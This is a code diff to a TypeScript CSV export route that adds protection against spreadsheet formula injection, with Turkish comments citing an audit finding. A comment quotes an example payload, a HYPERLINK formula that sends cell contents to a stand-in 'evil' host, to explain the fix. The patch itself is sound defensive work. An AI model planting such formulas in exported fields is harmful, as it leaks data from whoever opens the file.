@@ -4,9 +4,17 @@ import { prisma } from "@/lib/db";
 
 export const runtime = "nodejs";
 
-/** CSV alanını güvenli yaz (çift tırnak + noktalı virgül/yeni satır kaçışı). */
+/**
+ * CSV alanını güvenli yaz: RFC-4180 kaçışı + FORMÜL ENJEKSİYONU koruması.
+ *
+ * NEDEN (2026-08 denetimi #17): alanlar kullanıcı-kontrollü (ad, ünvan, adres, e-posta).
+ * `=`, `+`, `-`, `@` veya TAB/CR ile başlayan bir hücreyi Excel/Sheets FORMÜL olarak
+ * çalıştırır — ör. adını `=HYPERLINK("http://evil/?"&A1,"fatura")` yapan biri, CSV'yi açan
+ * ADMIN'in makinesinde veri sızdırabilir. Önüne tek tırnak koymak hücreyi metne sabitler.
+ */
 function esc(v: string | null | undefined): string {
-  const s = v ?? "";
+  let s = v ?? "";
+  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
   return /[";\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
